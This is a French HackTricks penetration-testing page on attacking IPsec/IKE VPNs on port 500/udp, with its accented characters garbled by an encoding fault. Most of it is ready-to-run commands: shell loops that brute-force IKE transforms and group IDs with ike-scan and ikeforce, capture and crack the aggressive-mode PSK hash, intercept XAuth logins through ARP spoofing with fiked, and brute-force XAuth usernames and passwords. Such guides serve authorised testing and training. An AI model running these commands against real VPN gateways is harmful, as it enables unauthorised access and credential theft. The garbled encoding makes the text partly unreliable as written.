# 500/udp - Test d'intrusion IPsec/IKE VPN

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

**Groupe de s√©curit√© Try Hard**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Informations de base

**IPsec** est largement reconnu comme la technologie principale pour s√©curiser les communications entre les r√©seaux (LAN √† LAN) et des utilisateurs distants √† la passerelle r√©seau (acc√®s distant), servant de base aux solutions VPN d'entreprise.

L'√©tablissement d'une **association de s√©curit√© (SA)** entre deux points est g√©r√© par **IKE**, qui op√®re sous l'√©gide d'ISAKMP, un protocole con√ßu pour l'authentification et l'√©change de cl√©s. Ce processus se d√©roule en plusieurs phases :

* **Phase 1 :** Un canal s√©curis√© est cr√©√© entre deux points. Cela est r√©alis√© gr√¢ce √† l'utilisation d'une cl√© pr√©-partag√©e (PSK) ou de certificats, en utilisant soit le mode principal, qui implique trois paires de messages, soit le **mode agressif**.
* **Phase 1.5 :** Bien que non obligatoire, cette phase, connue sous le nom de Phase d'authentification √©tendue, v√©rifie l'identit√© de l'utilisateur tentant de se connecter en demandant un nom d'utilisateur et un mot de passe.
* **Phase 2 :** Cette phase est d√©di√©e √† la n√©gociation des param√®tres de s√©curisation des donn√©es avec **ESP** et **AH**. Elle permet l'utilisation d'algorithmes diff√©rents de ceux de la Phase 1 pour assurer la **parfaite confidentialit√© en avant (PFS)**, renfor√ßant la s√©curit√©.

**Port par d√©faut :** 500/udp

## **D√©couvrez** le service en utilisant nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Trouver une transformation valide**

La configuration IPSec peut √™tre pr√©par√©e pour n'accepter qu'une ou quelques transformations. Une transformation est une combinaison de valeurs. Chaque transform contient un certain nombre d'attributs tels que DES ou 3DES comme algorithme de chiffrement, SHA ou MD5 comme algorithme d'int√©grit√©, une cl√© pr√©-partag√©e comme type d'authentification, Diffie-Hellman 1 ou 2 comme algorithme de distribution de cl√© et 28800 secondes comme dur√©e de vie.

La premi√®re chose √† faire est donc de trouver une transformation valide, afin que le serveur puisse communiquer avec vous. Pour ce faire, vous pouvez utiliser l'outil ike-scan. Par d√©faut, Ike-scan fonctionne en mode principal et envoie un paquet √† la passerelle avec un en-t√™te ISAKMP et une seule proposition contenant huit transformations √† l'int√©rieur.

En fonction de la r√©ponse, vous pouvez obtenir des informations sur le point de terminaison :
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Comme vous pouvez le voir dans la r√©ponse pr√©c√©dente, il y a un champ appel√© **AUTH** avec la valeur **PSK**. Cela signifie que le VPN est configur√© en utilisant une cl√© pr√©partag√©e (et c'est vraiment bon pour un testeur d'intrusion).\
**La valeur de la derni√®re ligne est √©galement tr√®s importante :**

* _0 returned handshake; 0 returned notify:_ Cela signifie que la cible n'est **pas une passerelle IPsec**.
* _**1 returned handshake; 0 returned notify:**_ Cela signifie que la **cible est configur√©e pour IPsec et est pr√™te √† effectuer une n√©gociation IKE, et qu'une ou plusieurs des transformations que vous avez propos√©es sont acceptables** (une transformation valide sera affich√©e dans la sortie).
* _0 returned handshake; 1 returned notify:_ Les passerelles VPN r√©pondent avec un message de notification lorsque **aucune des transformations n'est acceptable** (bien que certaines passerelles ne le fassent pas, auquel cas une analyse suppl√©mentaire et une proposition r√©vis√©e devraient √™tre essay√©es).

Ensuite, dans ce cas, nous avons d√©j√† une transformation valide, mais si vous vous trouvez dans le 3√®me cas, alors vous devez **forcer un peu pour trouver une transformation valide :**

Tout d'abord, vous devez cr√©er toutes les transformations possibles :
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Et ensuite effectuez une attaque par force brute sur chacun en utilisant ike-scan (cela peut prendre plusieurs minutes) :
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Si la m√©thode de la force brute n'a pas fonctionn√©, peut-√™tre que le serveur r√©pond sans poign√©es de main m√™me aux transformations valides. Ensuite, vous pourriez essayer la m√™me m√©thode de force brute mais en utilisant le mode agressif :
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Esp√©rons que **une transformation valide soit renvoy√©e**.\
Vous pouvez essayer la **m√™me attaque** en utilisant [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Vous pourriez √©galement essayer de forcer les transformations avec [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

Dans **Groupe DH : 14 = MODP 2048 bits** et **15 = 3072 bits**\
**2 = HMAC-SHA = SHA1 (dans ce cas). Le format `--trans` est $Enc,$Hash,$Auth,$DH**

Cisco indique d'√©viter d'utiliser les groupes DH 1 et 2 car ils ne sont pas assez forts. Les experts estiment que **les pays disposant de nombreuses ressources peuvent facilement casser le chiffrement** des donn√©es utilisant ces groupes faibles. Cela se fait en utilisant une m√©thode sp√©ciale qui les pr√©pare √† casser rapidement les codes. M√™me si cela co√ªte cher de mettre en place cette m√©thode, cela permet √† ces pays puissants de lire les donn√©es chiffr√©es en temps r√©el si elles utilisent un groupe qui n'est pas fort (comme 1 024 bits ou moins).

### Fingerprinting du serveur

Ensuite, vous pouvez utiliser ike-scan pour essayer de **d√©couvrir le fournisseur** du dispositif. L'outil envoie une proposition initiale et arr√™te de rejouer. Ensuite, il **analyse** la **diff√©rence de temps** entre les **messages** re√ßus du serveur et le mod√®le de r√©ponse correspondant, le testeur d'intrusion peut identifier avec succ√®s le fournisseur de passerelle VPN. De plus, certains serveurs VPN utiliseront la charge utile **ID de fournisseur (VID)** avec IKE.

**Sp√©cifiez la transformation valide si n√©cessaire** (en utilisant --trans)

Si IKE d√©couvre quel est le fournisseur, il l'affichera :
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Cela peut √©galement √™tre r√©alis√© avec le script nmap _**ike-version**_

## Trouver le bon ID (nom de groupe)

Pour √™tre autoris√© √† capturer le hash, vous avez besoin d'une transformation valide prenant en charge le mode Aggressif et le bon ID (nom de groupe). Vous ne conna√Ætrez probablement pas le nom de groupe valide, vous devrez donc le brute-force.\
Pour ce faire, je vous recommande 2 m√©thodes :

### Brute-force de l'ID avec ike-scan

Tout d'abord, essayez de faire une demande avec un faux ID pour essayer de r√©cup√©rer le hash ("-P") :
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Si **aucun hash n'est renvoy√©**, alors probablement cette m√©thode de force brute fonctionnera. **Si un hash est renvoy√©, cela signifie qu'un faux hash va √™tre renvoy√© pour un faux ID, donc cette m√©thode ne sera pas fiable** pour la force brute de l'ID. Par exemple, un faux hash pourrait √™tre renvoy√© (cela se produit dans les versions modernes) :

![](<../.gitbook/assets/image (917).png>)

Mais comme je l'ai dit, si aucun hash n'est renvoy√©, vous devriez essayer de forcer les noms de groupe courants en utilisant ike-scan.

Ce script **essaiera de forcer les IDs possibles** et renverra les IDs o√π une poign√©e de main valide est renvoy√©e (ce sera un nom de groupe valide).

Si vous avez d√©couvert une transformation sp√©cifique, ajoutez-la dans la commande ike-scan. Et si vous avez d√©couvert plusieurs transformations, n'h√©sitez pas √† ajouter une nouvelle boucle pour les essayer toutes (vous devriez les essayer toutes jusqu'√† ce que l'une d'entre elles fonctionne correctement).

Vous pouvez utiliser le [dictionnaire d'ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ou [celui de seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) des noms de groupe courants pour les forcer :
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
### Bruteforcing ID with Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) utilise √©galement **ike-scan** pour effectuer une attaque par force brute sur les noms de groupe possibles. Il suit sa propre m√©thode pour **trouver un ID valide bas√© sur la sortie de ike-scan**.

### Bruteforcing ID with ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) est un outil qui peut √™tre utilis√© pour **forcer de mani√®re brute les IDs √©galement**. Cet outil **essaiera d'exploiter diff√©rentes vuln√©rabilit√©s** qui pourraient √™tre utilis√©es pour **diff√©rencier un ID valide d'un ID non valide** (il peut y avoir des faux positifs et des faux n√©gatifs, c'est pourquoi je pr√©f√®re utiliser la m√©thode ike-scan si possible).

Par d√©faut, **ikeforce** enverra au d√©but quelques IDs al√©atoires pour v√©rifier le comportement du serveur et d√©terminer la tactique √† utiliser.

* La **premi√®re m√©thode** consiste √† effectuer une attaque par force brute sur les noms de groupe en **recherchant** les informations **Dead Peer Detection DPD** des syst√®mes Cisco (ces informations ne sont renvoy√©es que par le serveur si le nom du groupe est correct).
* La **deuxi√®me m√©thode** disponible consiste √† **v√©rifier le nombre de r√©ponses envoy√©es √† chaque tentative** car parfois plus de paquets sont envoy√©s lorsque le bon ID est utilis√©.
* La **troisi√®me m√©thode** consiste √† **rechercher "INVALID-ID-INFORMATION" en r√©ponse √† un ID incorrect**.
* Enfin, si le serveur ne renvoie rien aux v√©rifications, **ikeforce** tentera de forcer de mani√®re brute le serveur et v√©rifiera si lorsque le bon ID est envoy√©, le serveur renvoie un paquet.\
√âvidemment, l'objectif de la force brute sur l'ID est d'obtenir la **PSK** lorsque vous avez un ID valide. Ensuite, avec l'**ID** et la **PSK**, vous devrez effectuer une attaque par force brute sur le XAUTH (si celui-ci est activ√©).

Si vous avez d√©couvert une transformation sp√©cifique, ajoutez-la dans la commande ikeforce. Et si vous avez d√©couvert plusieurs transformations, n'h√©sitez pas √† ajouter une nouvelle boucle pour les essayer toutes (vous devriez les essayer toutes jusqu'√† ce que l'une d'entre elles fonctionne correctement).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Capture d'ID

(Du livre **√âvaluation de la s√©curit√© du r√©seau : Connaissez votre r√©seau**) : Il est √©galement possible d'obtenir des noms d'utilisateur valides en √©coutant la connexion entre le client VPN et le serveur, car le premier paquet de mode agressif contenant l'ID du client est envoy√© en clair

![](<../.gitbook/assets/image (891).png>)

## Capture et craquage du hash

Enfin, si vous avez trouv√© une **transformation valide** et le **nom du groupe** et si le **mode agressif est autoris√©**, alors vous pouvez tr√®s facilement obtenir le hash crackable :
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Le hash sera enregistr√© √† l'int√©rieur de _hash.txt_.

Vous pouvez utiliser **psk-crack**, **john** (en utilisant [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) et **hashcat** pour **cracker** le hash :
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Le mode Aggressive IKE** combin√© √† une **Cl√© Pr√©-partag√©e (PSK)** est couramment utilis√© √† des fins d'**authentification de groupe**. Cette m√©thode est compl√©t√©e par **XAuth (Authentification √âtendue)**, qui sert √† introduire une couche suppl√©mentaire d'**authentification utilisateur**. Une telle authentification exploite g√©n√©ralement des services comme **Microsoft Active Directory**, **RADIUS**, ou des syst√®mes comparables.

En passant √† **IKEv2**, on observe un changement notable o√π **EAP (Protocole d'Authentification Extensible)** est utilis√© √† la place de **XAuth** dans le but d'authentifier les utilisateurs. Ce changement souligne une √©volution des pratiques d'authentification au sein des protocoles de communication s√©curis√©e.

### MitM du r√©seau local pour capturer les identifiants

Ainsi, vous pouvez capturer les donn√©es de connexion en utilisant _fiked_ et voir s'il y a un nom d'utilisateur par d√©faut (Vous devez rediriger le trafic IKE vers `fiked` pour l'√©coute, ce qui peut √™tre fait √† l'aide de l'usurpation ARP, [plus d'informations](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked agira en tant que point de terminaison VPN et capturera les identifiants XAuth :
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
### Brute-forcing XAUTH username ad password with ikeforce

Pour effectuer une attaque de force brute sur le **XAUTH** (lorsque vous connaissez un nom de groupe valide **id** et le **psk**), vous pouvez utiliser un nom d'utilisateur ou une liste de noms d'utilisateur et une liste de mots de passe:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
De cette mani√®re, ikeforce va essayer de se connecter en utilisant chaque combinaison nom d'utilisateur : mot de passe.

Si vous avez trouv√© un ou plusieurs jeux de transformations valides, utilisez-les comme dans les √©tapes pr√©c√©dentes.

## Authentification avec un VPN IPSEC

Dans Kali, **VPNC** est utilis√© pour √©tablir des tunnels IPsec. Les **profils** doivent √™tre situ√©s dans le r√©pertoire `/etc/vpnc/`. Vous pouvez initier ces profils en utilisant la commande _**vpnc**_.

Les commandes et configurations suivantes illustrent le processus de configuration d'une connexion VPN avec VPNC :
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
Dans cette configuration :

* Remplacez `[VPN_GATEWAY_IP]` par l'adresse IP r√©elle de la passerelle VPN.
* Remplacez `[VPN_CONNECTION_ID]` par l'identifiant de la connexion VPN.
* Remplacez `[VPN_GROUP_SECRET]` par le secret de groupe VPN.
* Remplacez `[VPN_USERNAME]` et `[VPN_PASSWORD]` par les informations d'authentification VPN.
* `[PID]` symbolise l'ID de processus qui sera attribu√© lorsque `vpnc` sera lanc√©.

Assurez-vous d'utiliser des valeurs r√©elles et s√©curis√©es pour remplacer les espaces r√©serv√©s lors de la configuration du VPN.

## Mat√©riel de r√©f√©rence

* [Document de craquage PSK](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Balayage d'une impl√©mentation VPN](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* √âvaluation de la s√©curit√© du r√©seau, 3√®me √©dition

## Shodan

* `port:500 IKE`

**Groupe de s√©curit√© Try Hard**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
